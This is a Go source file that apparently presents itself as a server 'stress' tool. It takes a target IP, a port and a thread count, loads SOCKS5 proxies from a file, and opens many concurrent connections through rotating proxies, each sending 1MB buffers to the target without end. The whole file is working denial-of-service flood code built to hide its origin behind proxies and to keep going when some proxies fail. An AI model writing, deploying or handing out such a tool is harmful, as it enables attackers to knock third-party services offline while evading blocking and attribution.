package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strconv"
	"strings"
	"sync"

	netproxy "golang.org/x/net/proxy"
)

type Proxy struct {
	address string
	failed  int
	mu      sync.Mutex
}

func (p *Proxy) fail() {
	p.mu.Lock()
	defer p.mu.Unlock()
	p.failed++
}

func (p *Proxy) reset() {
	p.mu.Lock()
	defer p.mu.Unlock()
	p.failed = 0
}

func (p *Proxy) isFailed() bool {
	p.mu.Lock()
	defer p.mu.Unlock()
	return p.failed >= 2
}

func stressServer(address string, wg *sync.WaitGroup, data []byte, proxies []*Proxy, i int) {
	defer wg.Done()

	for {
		proxy := proxies[i%len(proxies)]
		if proxy.isFailed() {
			log.Printf("Proxy %s has failed too many times, skipping...\n", proxy.address)
			i++
			continue
		}

		log.Printf("Attempting to connect to server %s using proxy %s...\n", address, proxy.address)
		dialer, err := netproxy.SOCKS5("tcp", proxy.address, nil, netproxy.Direct)
		if err != nil {
			log.Printf("Error creating dialer for proxy %s: %v\n", proxy.address, err)
			proxy.fail()
			i++
			continue
		}

		conn, err := dialer.Dial("tcp", address)
		if err != nil {
			log.Printf("Error dialing server %s using proxy %s: %v\n", address, proxy.address, err)
			proxy.fail()
			i++
			continue
		}

		log.Printf("Successfully connected to server %s using proxy %s. Starting to send data...\n", address, proxy.address)
		for {
			_, err := conn.Write(data)
			if err != nil {
				log.Printf("Error writing data to server %s using proxy %s: %v\n", address, proxy.address, err)
				break
			}
		}

		log.Printf("Closing connection to server %s using proxy %s...\n", address, proxy.address)
		conn.Close()
	}
}

func main() {
	reader := bufio.NewReader(os.Stdin)

	fmt.Print("Enter IP: ")
	ip, _ := reader.ReadString('\n')
	ip = ip[:len(ip)-1] // Remove newline character

	fmt.Print("Enter port: ")
	port, _ := reader.ReadString('\n')
	port = port[:len(port)-1] // Remove newline character

	fmt.Print("Enter amount of threads: ")
	threadsStr, _ := reader.ReadString('\n')
	threadsStr = threadsStr[:len(threadsStr)-1] // Remove newline character
	threads, err := strconv.Atoi(threadsStr)
	if err != nil {
		log.Fatal(err)
	}

	proxyData, err := ioutil.ReadFile("socks5.txt")
	if err != nil {
		log.Fatal(err)
	}
	proxyAddresses := strings.Split(string(proxyData), "\n")
	proxies := make([]*Proxy, len(proxyAddresses))
	for i, proxyAddress := range proxyAddresses {
		proxies[i] = &Proxy{address: proxyAddress}
	}

	address := ip + ":" + port
	data := make([]byte, 1024*1024) // 1MB
	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go stressServer(address, &wg, data, proxies, i) // Start a new goroutine
	}

	wg.Wait()
}
